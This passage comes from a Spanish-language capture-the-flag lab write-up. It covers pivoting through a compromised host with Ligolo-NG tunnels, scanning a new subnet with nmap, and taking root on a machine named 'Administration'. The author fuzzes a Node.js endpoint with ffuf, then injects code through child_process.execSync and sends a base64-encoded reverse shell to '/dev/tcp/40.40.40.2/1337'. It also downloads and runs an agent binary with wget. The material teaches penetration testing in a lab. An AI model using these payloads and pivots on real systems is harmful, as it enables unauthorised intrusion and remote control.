En este punto, se detecta que esta máquina pertenece a dos redes diferentes. Se comprueba en este caso a través del archivo “/etc/hosts” (no se ha encontrado otra forma de comprobarlo en este caso) que el nombre de la máquina “Node” está asociada a dos direcciones IP de dos redes diferentes.
```ruby
cat /etc/hosts
```
<img width="394" height="158" alt="image" src="https://github.com/user-attachments/assets/defff081-ed1e-44c0-9f25-cd8d31e332cc" />


Extraer credenciales sensibles (clave privada SSH)
Obtener acceso al sistema mediante SSH

Al haber comprometido esta máquina, es posible utilizarla como “pivote” para poder detectar nuevos sistemas en la otra red a la que pertenece (en este caso, para acceder a la siguiente máquina del ejercicio). Por ello, vamos a hacer que la máquina “Node” sea el tercer “pivote” de este ejercicio.

Para que el agente de este nuevo “pivote” pueda detectar el servicio que expone el proxy y conectarse a él, es necesario configurar una nueva redirección para el puerto 11601 (el servicio a la escucha del proxy de Ligolo-NG) usando la sesión activa del segundo “pivote”. De esta forma, el nuevo agente podrá conectarse al proxy a través de la redirección establecida por el segundo “pivote”.

Además, se aprovecha esta visita al proxy y también se redirigen los otros puertos reservados para consola inversa (puerto 1337) y transferencia de ficheros (puerto 8008).
```ruby
desde el proxy, seleccionando la segunda sesión
listener_add --addr 0.0.0.0:11601 --to 127.0.0.1:11601 --tcp (proxy puerto 11601 <-> agente puerto 11601)
listener_add --addr 0.0.0.0:1337 --to 127.0.0.1:1337 --tcp (proxy puerto 1337 <-> agente puerto 1337)
listener_add --addr 0.0.0.0:8008 --to 127.0.0.1:8008 --tcp (proxy puerto 8008 <-> agente puerto 8008)
listener_list
```

<img width="1146" height="317" alt="image" src="https://github.com/user-attachments/assets/454a3fa9-dd13-4188-82a1-9580e6bc3328" />

A continuación se conectará la máquina “pivote” al proxy mediante el agente descargado. Para ello, se transfiere el agente a la máquina, se le asignan permisos de ejecución y se le indica que se conecte al servicio del proxy que se encuentra a la escucha. En este caso, apuntando a la dirección IP del segundo “pivote”, ya que es el encargado de redirigir el puerto y hacerlo visible para el tercero.

(nueva consola en máquina de trabajo)
python3 -m http.server 8008 (levantar un servidor HTTP en el directorio donde se encuentra el binario del agente descargado, usando el puerto 8008 para hacer visibles los recursos, ya que ya se está redirigiendo a través del segundo "pivote")
```ruby
(en la tercera máquina "pivote")
cd /tmp
wget http://30.30.30.2:8008/agent (descargar el agente en la tercera máquina "pivote")
ls -al agent
chmod +x agent
./agent -connect 30.30.30.2:11601 -ignore-cert (inidicar al agente que se conecte al proxy, apuntando al puerto redirigido a través de la segunda máquina "pivote")
```

El agente indica que se ha establecido una conexión. Al volver al proxy, se puede comprobar que este la ha recibido correctamente.

```ruby
[Agent : app@db5ee3b6cabc] » INFO[8233] Agent joined.    id=02421e1e1e03 name=node@a580ec7bcc54 remote="127.0.0.1:54264"
```

<img width="1265" height="22" alt="image" src="https://github.com/user-attachments/assets/3a2b29bb-f9b0-4534-bf94-e59fe4bd94df" />


El siguiente paso consiste en seleccionar la sesión recientemente iniciada y comprobar las interfaces de red de la máquina “pivote”.
```ruby
En el proxy
session (seleccionar la 3)
ifconfig
```

Una vez conocida la dirección CIDR de la nueva red, es necesario crear una nueva interfaz TUN en la máquina de trabajo para poder redirigir el tráfico de red a esta.
```ruby
sudo ip tuntap add user root mode tun ligolo3 (crear la interfaz TUN llamada "ligolo3")
sudo ip link set ligolo3 up (levanta la interfaz de red creada)
ip link show ligolo3 (comprobar el estado de la interfaz)
```

El siguiente paso consiste en actualizar la tabla de enrutamiento para que el tráfico de la nueva red se enrute a través de la interfaz “ligolo3”.
```
sudo ip route add 40.40.40.0/24 dev ligolo3 (asociar la dirección CIDR de la nueva red a la interfaz "ligolo3" en la tabla de enrutamiento)
ip route list (listar la tabla de enrutamiento actualizada)
```

<img width="672" height="129" alt="image" src="https://github.com/user-attachments/assets/704dd65a-fd25-463a-9201-3d04c5c3d7a1" />

Una vez hecho esto, desde el proxy se da la instrucción para, usando la sesión activa, iniciar el túnel de red a través de la interfaz “ligolo3”. Esto se hace para permitir enrutar tráfico hacia la red del agente.

<img width="539" height="38" alt="image" src="https://github.com/user-attachments/assets/d5d13d7c-1dc0-4cfe-a700-03e139b35cc9" />


Al realizar esta operación, quedaría comprobar si la siguiente máquina perteneciente a la nueva red es accesible. Para ello, se realiza un ping y se comprueba su TTL, tal y como se ha hecho con la anterior.
```
ping 40.40.40.3 -c 1
```
<img width="492" height="146" alt="image" src="https://github.com/user-attachments/assets/b9a8fc6d-334a-473d-a8f2-7e8c5c14de35" />


Se puede comprobar que el TTL asignado es 64, indicando que la máquina está accesible directamente sin ningún nodo intermediario y por otro lado que el sistema subyacente es GNU/Linux. Por lo que, es posible continuar de forma normal con el siguiente reconocimiento inicial.
Reconocimiento inicial (máquina “Administration”, 40.40.40.3)

Se realiza un reconocimiento de los servicios disponibles en dos fases. En la primera, se realiza un escaneo de todos los puertos TCP usando nmap para detectar en primera instancia cuales de ellos son accesibles (open), utilizando un escaneo TCP Connect. En el segundo reconocimiento inicial se explica por qué en este caso se realiza un escaneo en modo TCP Connect en lugar de TCP SYN.
```ruby
sudo nmap -sT -p- -n -Pn 40.40.40.3
```
<img width="565" height="188" alt="image" src="https://github.com/user-attachments/assets/5b018c6c-6f9c-48f3-8650-0d3ae9bfc9a1" />

En la segunda, se realiza un reconocimiento básico de los servicios subyacentes también mediante el uso de nmap. Esta vez, realizando dicha tarea de reconocimiento únicamente en los puertos detectados como abiertos.
```ruby
nmap -sCV -p 9999 -n -Pn 40.40.40.3 -oN services-40.40.40.3
```
<img width="806" height="176" alt="image" src="https://github.com/user-attachments/assets/ff6f80ec-ab8e-4897-91ac-3cce0aeb49a3" />
En este caso, se omite el escaneo de puertos UDP, ya que para esta máquina en particular no tiene ningún servicio relevante para llevar a cabo el ejercicio.

## Acceso inicial (root, máquina “Administration”, 40.40.40.3)

En este caso se detecta que hay un puerto abierto:

    Puerto 9999 (servicio HTTP, Node.js/Express)

Tras investigar el servicio en el puerto 9999 disponible en esta máquina, parece que devuelve un mensaje al intentar acceder desde el navegador.

URL -> http://40.40.40.3:9999

message: "Only POST available"

<img width="608" height="212" alt="image" src="https://github.com/user-attachments/assets/661910fc-7e2b-4454-b340-103bc42a9235" />

Esto significa que cualquier petición que se haga mediante el método GET a este servicio recibirá una respuesta similar. Por ello, se prueba a realizar una petición con cURL usando el método POST para comprobar el resultado obtenido.
```RUBY
curl -X POST -s http://40.40.40.3:9999/ | jq (se usa "jq" para que salga más legible la respuesta en formato JSON)
````
<img width="503" height="453" alt="image" src="https://github.com/user-attachments/assets/0e3976c2-cb1c-4c02-aaa5-c6b21ac3452f" />

El error que figura en la respuesta da una pista de que quizá se puedan ejecutar comandos de alguna manera. Por ello, se comprueba la existencia de algún parámetro POST que realice esto. Y efectivamente, se detecta un parámetro POST denominado “id”.
```ruby
ffuf -X POST -u "http://40.40.40.3:9999" -d '{"FUZZ":"app"}' -H "Content-Type: application/json" -w "/usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt" -fs 181
```
<img width="1401" height="481" alt="image" src="https://github.com/user-attachments/assets/67b8e5a9-0c3e-4c1b-aa2a-efa7b69f8ccc" />

Se confirma la función de ese parámetro realizando una petición cURL incluyéndolo en esta. Sin embargo, esta vez devuelve un nuevo error, indicando la imposibilidad de ejecutar código, ya que “app” no está definido.
```ruby
curl -X POST -s http://40.40.40.3:9999/ -d '{"id":"app"}' -H "Content-Type: application/json" | jq
```
result: Error executing code: app is not defined

<img width="869" height="465" alt="image" src="https://github.com/user-attachments/assets/8caa893e-599a-42a7-8961-d0a62130e91e" />


Tal y como indica los resultados de nmap, el recurso accesible tras este puerto es una aplicación escrita en Node.js. Por ello, se utiliza una carga útil en este lenguaje para intentar ejecutar comandos del sistema. Se incluye en la petición, sustituyendo el valor “app” por esta. La respuesta a esa petición resulta en una ejecución de comandos del sistema satisfactoria.
```
curl -X POST -s http://40.40.40.3:9999/ -d '{"id":"require(\"child_process\").execSync<ENTRE PARÉNTESIS Y ENTRE COMILLAS ESCAPADAS EL COMANDO QUE QUIERAS>.toString()"}' -H "Content-Type: application/json" | jq
```

Antes de poder ejecutar una petición para establecer una consola inversa (reverse shell), es necesario realizar unas configuraciones en el proxy de Ligolo-NG para poder tener acceso a ciertos recursos. Por ello, se van a realizar las configuraciones en el proxy que ya se venían haciendo, pero esta vez en el tercer “pivote”.

Se redirigen los 3 puertos, para demostrar que en el caso de que fuera necesario continuar pivotando sería posible siguiendo la misma técnica, y también para poder establecer la consola inversa con la última de la máquinas.
```ruby
(en el proxy, desde la sesión activa correspondiente)
listener_add --addr 0.0.0.0:11601 --to 127.0.0.1:11601 --tcp (proxy puerto 11601 <-> agente puerto 11601)
listener_add --addr 0.0.0.0:1337 --to 127.0.0.1:1337 --tcp (proxy puerto 1337 <-> agente puert 1337)
listener_add --addr 0.0.0.0:8008 --to 127.0.0.1:8008 --tcp (proxy puerto 8008 <-> agente puerto 8008)
listener_list (comprobar redirecciones realizadas)
Por ejemplo, ejecutar comando "id": Sustituir el comentario por lo siguiente -> (\"id\")
```
<img width="732" height="239" alt="image" src="https://github.com/user-attachments/assets/2aae1f55-99ed-4b8b-ae0a-3db830e07c4b" />

En este punto, se establece el puerto 1337 a la escucha, ya que es el puerto que se ha reservado desde los distintos agentes para establecer una consola inversa, de tal forma que lo que reciba cada agente con las redirecciones definidas, será redirigido hasta terminar en este puerto a la escucha en la máquina de trabajo.
```
rlwrap nc -nvlp 1337
```
<img width="535" height="88" alt="image" src="https://github.com/user-attachments/assets/ff53e16b-a77e-4975-8770-975d20135f2d" />

Una vez hecho esto, se codifica en Base64 una carga útil y se ejecuta de la misma forma que el comando “id”.
```ruby
echo "sh -i >& /dev/tcp/40.40.40.2/1337 0>&1" | base64
curl -X POST -s http://40.40.40.3:9999/ -d '{"id":"require(\"child_process\").execSync<ENTRE PARÉNTESIS Y ENTRE COMILLAS ESCAPADAS EL COMANDO DE LA CARGA ÚTIL>.toString()"}' -H "Content-Type: application/json" | jq
Elemento a incluir: Sustituir el comentario por lo siguiente -> (\"echo <TU CARGA ÚTIL CODIFICADO EN BASE64> | base64 -d | bash\")
```

Esta ejecución resulta en un acceso instantáneo al sistema a través del puerto a la escucha que se ha puesto en la máquina de trabajo, capturando una consola del sistema con acceso al usuario “root”.
```ruby
whoami
id
hostname
cat /etc/hosts
```
<img width="401" height="164" alt="image" src="https://github.com/user-attachments/assets/844c4274-872d-4cda-bae1-8000441fb992" />

A continuación se actualiza la consola actual a una interactiva usando Python.

```ruby
tty (not a tty)
python3 --version (instalado)
python3 -c 'import pty;pty.spawn("/bin/bash")'
tty (/dev/pts/0)
```
<img width="426" height="136" alt="image" src="https://github.com/user-attachments/assets/d64d1585-05ec-43e6-9c68-2a0da56afd2b" />

Para finalizar, se obtiene la flag del usuario “root” en la última de las máquinas de este laboratorio.

```
cd /root
ls -al
cat IDadministrator.txt
```

<img width="578" height="203" alt="image" src="https://github.com/user-attachments/assets/e780421a-5590-44c0-91b1-203a008b0c5f" />

En este punto, al haber obtenido acceso a la cuenta “root” en la última máquina de este laboratorio, se ha conseguido completar el objetivo propuesto para este laboratorio.
